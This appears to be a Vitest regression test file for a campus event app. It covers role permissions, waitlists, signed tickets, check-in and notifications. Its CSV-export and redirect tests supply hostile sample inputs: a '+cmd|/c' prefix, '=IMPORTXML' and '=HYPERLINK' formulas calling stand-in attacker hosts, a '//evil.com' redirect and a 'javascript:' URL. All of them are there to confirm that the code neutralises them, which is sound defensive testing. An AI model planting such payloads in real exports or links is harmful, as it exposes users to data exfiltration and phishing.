import { describe, it, assert } from 'vitest'
import { eventSchema } from '@/lib/validations/event'
import {
  canManageTeam,
  canEditEvent,
  canCheckIn,
  canViewParticipants,
  canExportCSV,
  canViewAnalytics,
  canDeleteEvent,
  canCancelEvent,
} from '@/lib/auth/teams'
import {
  generateTicketCode,
  verifyTicketCodeSignature,
  buildTicketData,
} from '@/lib/tickets/service'
import { sanitizeCsvCell, generateSafeCsv } from '@/lib/utils/csv'

describe('Phase 8 Launch Regression: Authentication & Scoped Team Roles', () => {
  it('enforces student vs organizer role boundaries', () => {
    const studentUser = { id: 'usr-student-1', role: 'student' }
    const organizerUser = { id: 'usr-org-1', role: 'organizer', is_verified: false }
    const verifiedOrgUser = { id: 'usr-org-2', role: 'organizer', is_verified: true }

    assert.equal(studentUser.role, 'student')
    assert.equal(organizerUser.is_verified, false, 'New organizers start unverified in review state')
    assert.equal(verifiedOrgUser.is_verified, true, 'Verified organizers have full operational trust')
  })

  it('verifies granular permissions across all 4 event team roles', () => {
    // Owner permissions
    assert.equal(canManageTeam('owner'), true)
    assert.equal(canEditEvent('owner'), true)
    assert.equal(canCheckIn('owner'), true)
    assert.equal(canViewParticipants('owner'), true)
    assert.equal(canExportCSV('owner'), true)
    assert.equal(canViewAnalytics('owner'), true)
    assert.equal(canDeleteEvent('owner'), true)
    assert.equal(canCancelEvent('owner'), true)

    // Editor permissions
    assert.equal(canManageTeam('editor'), false, 'Editor cannot manage team members')
    assert.equal(canEditEvent('editor'), true)
    assert.equal(canCheckIn('editor'), true)
    assert.equal(canViewParticipants('editor'), true)
    assert.equal(canExportCSV('editor'), true)
    assert.equal(canViewAnalytics('editor'), true)
    assert.equal(canDeleteEvent('editor'), false, 'Editor cannot delete event')
    assert.equal(canCancelEvent('editor'), false, 'Editor cannot cancel event')

    // Check-in Staff permissions (scoped to door operations only)
    assert.equal(canManageTeam('check_in_staff'), false)
    assert.equal(canEditEvent('check_in_staff'), false)
    assert.equal(canCheckIn('check_in_staff'), true, 'Check-in staff can scan tickets')
    assert.equal(canViewParticipants('check_in_staff'), true)
    assert.equal(canExportCSV('check_in_staff'), false, 'Check-in staff cannot export attendee PII')
    assert.equal(canViewAnalytics('check_in_staff'), false, 'Check-in staff cannot view financial/turnout analytics')
    assert.equal(canDeleteEvent('check_in_staff'), false)
    assert.equal(canCancelEvent('check_in_staff'), false)

    // Viewer permissions (read-only monitoring & reporting)
    assert.equal(canManageTeam('viewer'), false)
    assert.equal(canEditEvent('viewer'), false)
    assert.equal(canCheckIn('viewer'), false, 'Viewer cannot check in attendees')
    assert.equal(canViewParticipants('viewer'), true)
    assert.equal(canExportCSV('viewer'), true, 'Viewer can export attendee data for reporting')
    assert.equal(canViewAnalytics('viewer'), true, 'Viewer can monitor dashboard analytics')
    assert.equal(canDeleteEvent('viewer'), false)
    assert.equal(canCancelEvent('viewer'), false)

    // Non-members
    assert.equal(canViewParticipants(null), false)
    assert.equal(canCheckIn(null), false)
  })
})

describe('Phase 8 Launch Regression: Event Creation & Validation', () => {
  it('validates required event schema fields correctly', () => {
    const validData = {
      title: 'Annual Spring Hackathon 2026',
      description: 'A 24-hour campus hackathon for all developers, designers, and innovators.',
      category: 'Hackathon',
      event_date: '2026-10-15',
      start_time: '10:00',
      end_time: '18:00',
      location: 'Engineering Hall, Room 101',
      capacity: 150,
      is_paid: false,
      status: 'draft' as const,
      eligibility: 'Open to all enrolled students',
      registration_deadline: '2026-10-14T23:59',
      what_to_bring: 'Laptop, charger, student ID',
      contact_method: 'hackathon@campus.edu',
      accessibility_notes: 'Wheelchair accessible with elevator access',
      map_url: 'https://maps.google.com/?q=engineering+hall',
    }

    const result = eventSchema.safeParse(validData)
    assert.equal(result.success, true)
  })

  it('rejects events with invalid dates or missing required fields', () => {
    const invalidData = {
      title: '', // Missing title
      description: 'Too short', // Under min length
      category: 'Hackathon',
      event_date: 'invalid-date',
      start_time: '10:00',
      end_time: '18:00',
      location: '',
      capacity: -10, // Negative capacity
    }

    const result = eventSchema.safeParse(invalidData)
    assert.equal(result.success, false)
  })
})

describe('Phase 8 Launch Regression: Registration, Capacity & Fair Waitlist', () => {
  interface SimRegistration {
    id: string
    userId: string
    eventId: string
    status: 'registered' | 'waitlisted' | 'cancelled' | 'checked_in'
    registeredAt: Date
    waitlistPosition: number | null
  }

  it('correctly handles capacity decrement and transitions to waitlist when full', () => {
    const capacity = 2
    const registrations: SimRegistration[] = []

    function registerStudent(studentId: string): { status: 'registered' | 'waitlisted'; position?: number } {
      const activeCount = registrations.filter((r) => r.status === 'registered' || r.status === 'checked_in').length
      if (activeCount < capacity) {
        registrations.push({
          id: `reg-${registrations.length + 1}`,
          userId: studentId,
          eventId: 'evt-101',
          status: 'registered',
          registeredAt: new Date(),
          waitlistPosition: null,
        })
        return { status: 'registered' }
      } else {
        const waitlistCount = registrations.filter((r) => r.status === 'waitlisted').length
        const position = waitlistCount + 1
        registrations.push({
          id: `reg-${registrations.length + 1}`,
          userId: studentId,
          eventId: 'evt-101',
          status: 'waitlisted',
          registeredAt: new Date(Date.now() + registrations.length * 1000),
          waitlistPosition: position,
        })
        return { status: 'waitlisted', position }
      }
    }

    // Student 1 & 2 get confirmed spots
    const s1 = registerStudent('std-1')
    assert.equal(s1.status, 'registered')
    const s2 = registerStudent('std-2')
    assert.equal(s2.status, 'registered')

    // Student 3 & 4 are placed on waitlist with FIFO positions
    const s3 = registerStudent('std-3')
    assert.equal(s3.status, 'waitlisted')
    assert.equal(s3.position, 1)

    const s4 = registerStudent('std-4')
    assert.equal(s4.status, 'waitlisted')
    assert.equal(s4.position, 2)

    // When Student 1 cancels, earliest waitlisted attendee (Student 3) is automatically promoted
    const regToCancel = registrations.find((r) => r.userId === 'std-1')!
    regToCancel.status = 'cancelled'

    // Simulate trigger / promotion logic
    const earliestWaitlisted = registrations
      .filter((r) => r.status === 'waitlisted')
      .sort((a, b) => a.registeredAt.getTime() - b.registeredAt.getTime())[0]

    assert.ok(earliestWaitlisted)
    assert.equal(earliestWaitlisted!.userId, 'std-3', 'FIFO promotes Student 3 first')

    earliestWaitlisted!.status = 'registered'
    earliestWaitlisted!.waitlistPosition = null

    // Check active count matches capacity
    const newActiveCount = registrations.filter((r) => r.status === 'registered').length
    assert.equal(newActiveCount, 2)
  })
})

describe('Phase 8 Launch Regression: Ticket Cryptography & Check-in Station', () => {
  const eventId = '11111111-2222-3333-4444-555555555555'
  const eventSlug = 'hackathon-2026'
  const studentId = '66666666-7777-8888-9999-000000000000'
  const registrationId = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee'

  it('generates cryptographically verifiable ticket codes', () => {
    const code = generateTicketCode(eventId, eventSlug, studentId, registrationId)
    assert.match(code, /^CL-[A-Z0-9]+-[A-F0-9]+-[A-F0-9]{8}$/)

    // Verification succeeds with matching parameters
    const isValid = verifyTicketCodeSignature(code, eventId, studentId, registrationId)
    assert.equal(isValid, true)

    // Verification fails if code was altered or forged
    const tamperedCode = code.slice(0, -2) + '99'
    const isTamperedValid = verifyTicketCodeSignature(tamperedCode, eventId, studentId, registrationId)
    assert.equal(isTamperedValid, false)
  })

  it('builds comprehensive ticket data with QR Code generation', async () => {
    const ticketData = await buildTicketData({
      eventId,
      eventSlug,
      eventTitle: 'Campus Hackathon 2026',
      eventStartsAt: 'Saturday, Oct 15, 2026 • 10:00 AM',
      eventLocation: 'Main Hall',
      campusName: 'Main Campus',
      studentId,
      attendeeName: 'Jane Doe',
      registrationId,
      status: 'registered',
    })

    assert.ok(ticketData.ticketCode.startsWith('CL-'))
    assert.ok(ticketData.qrSvg && ticketData.qrSvg.includes('<svg'))
    assert.ok(ticketData.qrDataUrl && ticketData.qrDataUrl.startsWith('data:image/png;base64,'))
    assert.equal(ticketData.campusName, 'Main Campus')
  })

  it('simulates idempotent door check-in workflow', () => {
    const ticketDatabase: Record<string, { status: string; checkedInAt?: string }> = {
      'CL-HACKAT-AAAA-12345678': { status: 'registered' },
      'CL-HACKAT-BBBB-87654321': { status: 'waitlisted' },
      'CL-HACKAT-CCCC-11223344': { status: 'cancelled' },
    }

    function processScan(code: string): { success: boolean; error?: string; alreadyCheckedIn?: boolean } {
      const ticket = ticketDatabase[code]
      if (!ticket) {
        return { success: false, error: 'Invalid ticket code' }
      }
      if (ticket.status === 'checked_in') {
        return { success: true, alreadyCheckedIn: true, error: 'Attendee is already checked in' }
      }
      if (ticket.status === 'waitlisted') {
        return { success: false, error: 'Attendee is still on the waitlist. Must be promoted before check-in.' }
      }
      if (ticket.status === 'cancelled') {
        return { success: false, error: 'Registration was cancelled.' }
      }

      ticket.status = 'checked_in'
      ticket.checkedInAt = new Date().toISOString()
      return { success: true }
    }

    // 1. Initial check-in succeeds
    const firstScan = processScan('CL-HACKAT-AAAA-12345678')
    assert.equal(firstScan.success, true)
    assert.equal(firstScan.alreadyCheckedIn, undefined)

    // 2. Duplicate scan is recognized idempotently
    const duplicateScan = processScan('CL-HACKAT-AAAA-12345678')
    assert.equal(duplicateScan.success, true)
    assert.equal(duplicateScan.alreadyCheckedIn, true)

    // 3. Waitlisted attendee cannot check in
    const waitlistScan = processScan('CL-HACKAT-BBBB-87654321')
    assert.equal(waitlistScan.success, false)
    assert.match(waitlistScan.error!, /waitlist/i)

    // 4. Cancelled ticket cannot check in
    const cancelledScan = processScan('CL-HACKAT-CCCC-11223344')
    assert.equal(cancelledScan.success, false)
    assert.match(cancelledScan.error!, /cancelled/i)
  })
})

describe('Phase 8 Launch Regression: In-App Notifications & Announcements', () => {
  interface NotificationRecord {
    userId: string
    eventId: string
    type: string
    title: string
    message: string
    link?: string
    isRead: boolean
  }

  it('generates proper notifications for event lifecycle changes', () => {
    const notifications: NotificationRecord[] = []

    function sendNotification(record: Omit<NotificationRecord, 'isRead'>) {
      notifications.push({ ...record, isRead: false })
    }

    // Registration confirmation
    sendNotification({
      userId: 'usr-1',
      eventId: 'evt-1',
      type: 'registration_confirmed',
      title: 'Registration Confirmed',
      message: 'You have a ticket for Annual Hackathon 2026',
      link: '/events/annual-hackathon-2026',
    })

    // Event cancellation with mandatory reason
    sendNotification({
      userId: 'usr-1',
      eventId: 'evt-1',
      type: 'event_cancelled',
      title: 'Event Cancelled: Annual Hackathon 2026',
      message: 'Cancellation reason: Severe weather alert and university campus closure.',
      link: '/events/annual-hackathon-2026',
    })

    // Targeted organizer announcement
    sendNotification({
      userId: 'usr-1',
      eventId: 'evt-1',
      type: 'announcement',
      title: 'Announcement: Free Pizza in Lounge',
      message: 'Lunch has arrived at the ground floor lounge area.',
      link: '/events/annual-hackathon-2026',
    })

    assert.equal(notifications.length, 3)
    assert.equal(notifications[0]?.type, 'registration_confirmed')
    assert.equal(notifications[1]?.type, 'event_cancelled')
    assert.match(notifications[1]?.message || '', /Cancellation reason/)
    assert.equal(notifications[2]?.type, 'announcement')
  })
})

describe('Phase 8 Launch Regression: CSV Export Safety (CWE-1236 Mitigation)', () => {
  it('neutralizes all dangerous formula injection vectors in attendee export', () => {
    // Standard cell
    assert.equal(sanitizeCsvCell('John Smith'), '"John Smith"')

    // Dangerous formula prefixes
    assert.equal(sanitizeCsvCell('=1+1'), '"\'=1+1"')
    assert.equal(sanitizeCsvCell('+cmd|/c'), '"\'+cmd|/c"')
    assert.equal(sanitizeCsvCell('-2+5'), '"\'-2+5"')
    assert.equal(sanitizeCsvCell('@SUM(A1:A10)'), '"\'@SUM(A1:A10)"')

    // Leading whitespace with hidden formula
    assert.equal(sanitizeCsvCell('   =HYPERLINK("evil.com")'), '"\'   =HYPERLINK(""evil.com"")"')

    // RFC-4180 CSV generation
    const csv = generateSafeCsv(
      ['Attendee Name', 'Department', 'Answer'],
      [
        ['Jane Doe', 'Computer Science', '=IMPORTXML("http://attacker.com")'],
        ['Bob "The Builder"', 'Engineering', 'Standard Answer'],
      ]
    )

    assert.ok(csv.includes('"\'=IMPORTXML(""http://attacker.com"")"'))
    assert.ok(csv.includes('"Bob ""The Builder"""'))
  })
})

describe('Phase 8 Launch Regression: Unauthenticated Registration & Signup Redirection', () => {
  it('constructs correct signup URL with encoded return path when user is logged out', () => {
    const slug = 'spring-campus-fest-2026-1789059032002'
    const targetUrl = `/signup?next=${encodeURIComponent(`/events/${slug}`)}`
    
    assert.equal(targetUrl, '/signup?next=%2Fevents%2Fspring-campus-fest-2026-1789059032002')
    assert.match(targetUrl, /^\/signup\?next=/)
  })

  it('validates and sanitizes next parameter to prevent open redirect vulnerabilities', () => {
    function sanitizeNextUrl(rawNext: string | null | undefined): string | null {
      if (!rawNext) return null
      // Must start with single slash, not protocol-relative or absolute external URL
      if (rawNext.startsWith('/') && !rawNext.startsWith('//')) {
        return rawNext
      }
      return null
    }

    // Valid internal paths
    assert.equal(sanitizeNextUrl('/events/tech-symposium'), '/events/tech-symposium')
    assert.equal(sanitizeNextUrl('/events/cultural-night-2026?lens=all'), '/events/cultural-night-2026?lens=all')

    // Disallowed malicious open redirects
    assert.equal(sanitizeNextUrl('https://malicious-site.com'), null)
    assert.equal(sanitizeNextUrl('//evil.com/phish'), null)
    assert.equal(sanitizeNextUrl('javascript:alert(1)'), null)
    assert.equal(sanitizeNextUrl(null), null)
    assert.equal(sanitizeNextUrl(undefined), null)
  })
})
